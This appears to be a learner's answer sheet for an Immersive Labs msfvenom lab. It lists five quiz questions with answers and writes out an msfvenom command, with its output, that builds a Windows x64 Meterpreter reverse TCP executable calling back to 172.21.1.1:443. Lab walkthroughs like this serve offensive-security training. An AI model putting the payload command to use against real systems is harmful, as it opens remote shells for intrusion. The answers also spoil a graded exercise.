About:
https://immersivelabs.online/labs/msfvenom/

Msfvenom
msfvenom is a combination of two frameworks that were used prior to June 2015: msfpayload and msfencode.

msfvenom was created as a quick standalone payload generator and encoder that would standardise the command line options for the previous tool set.

MITER ATT&CK
T1027
Obfuscated Files or Information: https://attack.mitre.org/versions/v6/techniques/T1027/

Lab:
Tasks
Get acquainted with msfvenom.
Using msfvenom on the Immersive Labs Kali client, answer the questions to earn the badge.

Question 1 of 5
Which option would you give to -p if you wanted to create a Windows x64 stageless reverse shell TCP payload?


Question 2 of 5
If you wanted to make sure your generated payload did not contain any null bytes, what option would you provide?
-b '\x00' 

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
See MSFvenom Command Line Usage

Question 3 of 5
Which encoder (Name) will use a single-byte XOR countdown encoder?

Question 4 of 5
Which of the following would correctly generate a reverse Meterpreter shell?

	msfvenom -p windows/x64/meterpreter/bind_udp lhost=172.21.1.1 lport=443 -f exe -o shell.exe

x	msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.21.1.1 lport=443 -f exe -o shell.exe

	msfvenom -p windows/x64/meterpreter/reverse_tcp -lhost 172.21.1.1 -lport 443 -f exe -o shell.exe

	msfvenom -p windows/x64/shell_reverse_tcp lhost=172.21.1.1 lport=443 -f exe -o shell.exe

Question 5 of 5
Using the correct payload from the question above, generate this payload. What is the final payload size?
510


msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.21.1.1 lport=443 -f exe -o shell.exe
``
[*] exec: msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.21.1.1 lport=443 -f exe -o shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
``